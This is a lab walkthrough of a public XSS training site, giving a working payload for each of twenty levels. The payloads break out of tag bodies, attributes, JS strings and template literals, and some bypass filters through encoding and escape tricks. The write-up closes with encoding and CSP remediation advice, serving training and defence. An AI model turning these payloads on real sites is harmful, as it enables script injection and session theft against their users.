# 🏋️ GYM XSS — p01 to p20 Full Payload Write-up

![XSS](https://img.shields.io/badge/vuln-XSS-red)
![Levels](https://img.shields.io/badge/levels-20%2F20-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-beginner→advanced-blue)
![Status](https://img.shields.io/badge/status-completed-success)

A walkthrough of [Brute Logic's XSS GYM](https://x55.is/brutelogic/gym.php), a training ground built to drill context-breaking for Cross-Site Scripting (XSS). Each parameter (`p01`, `p02`, ...) reflects user input into a different HTML or JavaScript context — sometimes behind a filter. The goal on every level is the same: identify the context, break out of it, and get `alert(origin)` to fire.

```
https://x55.is/brutelogic/gym.php?p01=<payload>
```

> **Methodology:** no recon tooling needed here — the fastest workflow is `Ctrl+U` on the response to see exactly how the reflection lands in the markup or JS, then craft the breakout from there.

## At a Glance

| # | Context | Filter / Twist | Technique |
|---|---------|-----------------|-----------|
| p01 | `<title>` body | none | Close tag + `<img onerror>` |
| p02 | `<noscript>` body | none | Close tag + `<img onerror>` |
| p03 | `<style>` body | `onerror` unreliable | `<img onmouseover>` |
| p04 | JS string | `'` stripped | Double URL-encoding |
| p05 | `<h1>` body | none | Close tag + `<img onerror>` |
| p06 | attribute (`"`) | none | Close attribute + tag |
| p07 | attribute (`'`) | none | Close attribute + tag |
| p08 | attribute (`"`) | `>` filtered | New attribute (`autofocus`) |
| p09 | attribute (`'`) | `>` filtered | New attribute (`autofocus`) |
| p10 | `<textarea>` | none | Close tag + `<img onerror>` |
| p11–p12 | `<script>` body | none | Close/reopen `<script>` |
| p13 | JS string (`'`) | none | Subtraction expression |
| p14 | JS string (`"`) | none | Subtraction expression |
| p15 | JS string (`'`) | `\` auto-escaped | Escape-the-escape |
| p16 | JS string (`"`) | `\` auto-escaped | Escape-the-escape |
| p17 | template literal | none | `</script>` early-exit |
| p18 | template literal | none | Subtraction expression |
| p19 | template literal | `\` extra-escaped | Escape-the-escape |
| p20 | template literal | `` \ ` `` extra-escaped | Native `${}` interpolation |

---

## Table of Contents

- [Levels 1–5 — Plain HTML tag breakouts](#levels-15--plain-html-tag-breakouts)
- [Levels 6–9 — Attribute breakouts](#levels-69--attribute-breakouts)
- [Level 10 — Textarea breakout](#level-10--textarea-breakout)
- [Levels 11–12 — Script tag, no filtering](#levels-1112--script-tag-no-filtering)
- [Levels 13–14 — JS string context, quote-expression breakout](#levels-1314--js-string-context-quote-expression-breakout)
- [Levels 15–16 — Backslash-escaped quotes](#levels-1516--backslash-escaped-quotes)
- [Level 17 — Template literal, unfiltered tags](#level-17--template-literal-unfiltered-tags)
- [Levels 18–20 — Template literal, expression + interpolation breakouts](#levels-1820--template-literal-expression--interpolation-breakouts)
- [Key Takeaways](#key-takeaways)
- [Remediation](#remediation-for-real-world-equivalents-of-these-contexts)

---

## Levels 1–5 — Plain HTML tag breakouts

Input reflects directly inside a tag body. Closing the tag and dropping in an image with a broken `src` is enough to get an error-handler to fire.

**p01 — inside `<title>`**
```html
</title><img src=x onerror=alert(origin)>
```

**p02 — inside `<noscript>`**
```html
</noscript><img src=x onerror=alert(origin)>
```

**p03 — inside `<style>`**

`onerror` doesn't fire reliably once we're inside a stylesheet context, so `onmouseover` is used instead — the resulting broken image icon pops on hover.
```html
</style><img src=x onmouseover="alert(origin)">
```

**p04 — filtered single quote, JS string context**

The app strips `'` before use. Double URL-encoding smuggles it past the filter: `%26apos;` decodes once to `&apos;`, then decodes again to `'`.
```
%26apos;-alert(origin)-%26apos;
```
Once fully decoded this becomes `'-alert(origin)-'`, which the JS engine treats as a subtraction expression — `alert(origin)` gets evaluated as part of it.

**p05 — inside `<h1>`**
```html
</h1><img src=x onerror=alert(origin)>
```

## Levels 6–9 — Attribute breakouts

Input lands inside an `<input>` tag's `value=""` attribute. Since there's no closing tag to reuse, the attribute itself has to be escaped first.

**p06 — double-quoted attribute**
```html
"><img src=x onerror=alert(origin)>
```

**p07 — single-quoted attribute**
```html
'><img src=x onerror=alert(origin)>
```

**p08 — double-quoted, `>` is filtered**

Can't close the tag, so stay inside it and add a new attribute pair instead. `autofocus` triggers `onfocus` as soon as the page loads.
```html
" autofocus onfocus=alert(origin) x="
```

**p09 — single-quoted, `>` is filtered**

Same idea as p08, single-quote flavor.
```html
' autofocus onfocus=alert(origin) x='
```

## Level 10 — Textarea breakout

**p10 — inside `<textarea>`**
```html
</textarea><img src=x onerror=alert(origin)>
```

## Levels 11–12 — Script tag, no filtering

Input reflects inside `<script>` and `<` isn't filtered, so the tag can just be closed and reopened.
```html
</script><script>alert(origin)</script>
```
An `<svg onload=alert(origin)>` or `<img src=x onerror=alert(origin)>` dropped in the same spot works just as well — the point of these two levels is recognizing that raw HTML tags are still viable once you're allowed to close `<script>`.

## Levels 13–14 — JS string context, quote-expression breakout

Input lands inside a quoted JS variable and `<` is filtered, so no tag tricks — the string itself has to be broken with an expression.

```javascript
// context
<script> var p13 = 'INPUT'; </script>
```

**p13 — single-quoted string**
```javascript
'-alert(origin)-'
```

**p14 — double-quoted string**
```javascript
"-alert(origin)-"
```
Empty strings coerce to `0` in a numeric context, so the payload resolves as `0 - alert(origin) - 0`. The subtraction forces evaluation of `alert(origin)` as part of the expression.

## Levels 15–16 — Backslash-escaped quotes

The app auto-escapes quote characters (`'` → `\'`), so the escape itself has to be escaped.

```javascript
// context after p15 injection
var p15 = '\'-alert(origin)//';
```

**p15 — single-quoted, backslash filter**
```javascript
\'-alert(origin)//
```

**p16 — double-quoted, backslash filter**
```javascript
\"-alert(origin)//
```
The leading `\'` (or `\"`) produces a legal escaped-quote string, `-alert(origin)` forces evaluation as an expression, and the trailing `//` comments out whatever's left on the line so nothing throws a syntax error.

## Level 17 — Template literal, unfiltered tags

Input reflects inside a JS template literal (backticks), but the browser's HTML parser is still scanning the page even while it's inside `<script>`. A `</script>` in the literal is enough to make the HTML parser end the script early and hand the rest to plain HTML parsing.
```html
</script><img src=x onerror=alert(origin)>
```

## Levels 18–20 — Template literal, expression + interpolation breakouts

**p18 — backtick string break**
```javascript
`-alert(origin)-`
```
Same subtraction-expression trick as p13/p14 — backticks coerce to `0` in numeric context too.

**p19 — backtick string, backslash filter**
```javascript
\`-alert(origin)//
```
Same escape-the-escape logic as p15/p16, adapted to backticks.

**p20 — both `\` and `` ` `` get extra-escaped**

Breaking out isn't viable anymore, but template literals natively interpolate `${...}` — no escaping needed at all.
```javascript
${alert(origin)}
```

## Key Takeaways

- Always check *where* the input lands (tag body, attribute, JS string, template literal) before picking a payload — the context dictates the breakout, not the vulnerability name.
- When a filter blocks the obvious character (`'`, `>`, `<`, `\`), look for an equivalent operation the engine will still parse: encoding tricks, expression evaluation, or a feature (like `${}`) that doesn't need the filtered character at all.
- `//` is a fast way to neutralize the rest of a line when your breakout leaves a dangling syntax error behind.

## Remediation (for real-world equivalents of these contexts)

- **Context-aware output encoding**: HTML-encode for tag bodies, attribute-encode for attribute values, JS-string-encode for inline script contexts — never one blanket encoder for all of them.
- **Avoid reflecting user input directly into `<script>` blocks or template literals** at all; pass data through `data-*` attributes or a JSON payload consumed by JS instead.
- **CSP with no `unsafe-inline`** blocks most of these payload classes outright, even if an encoding gap slips through.

---

## References

- [Brute Logic's XSS GYM](https://x55.is/brutelogic/gym.php) — the lab this write-up covers
- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) — background theory on XSS contexts and sinks
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — the remediation side of everything above

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · Lab: Brute Logic's XSS GYM · For educational purposes on a public training platform</sub>
</p>
